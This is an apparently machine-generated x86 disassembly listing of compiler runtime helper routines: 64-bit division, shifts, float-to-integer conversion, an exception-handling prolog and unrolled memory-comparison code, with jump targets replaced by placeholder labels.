shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_4497c0
push sub_40e4e0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_449820
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_449900
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_449940
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_449990
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_4499b0
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_449a65
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
sub ecx eax
je r-xdata
mov eax ecx
pop ebp
retn
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_449a8a
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
xor eax eax
pop ebp
retn
push esi
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
pop esi
pop ebp
retn
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ecx
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_449b31
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov ax [ ecx ]
cmp ax [ edx ]
je r-xdata
xor eax eax
pop ebp
retn
push esi
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
movzx ecx [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ecx
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
pop esi
pop ebp
retn
sub_449b82
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
sub eax 0x1
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
sub eax 0x1
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
sub eax 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_44b282 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx eax [ edx - 0x1f ]
movzx edi [ esi - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x8 ]
movzx edi [ esi - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
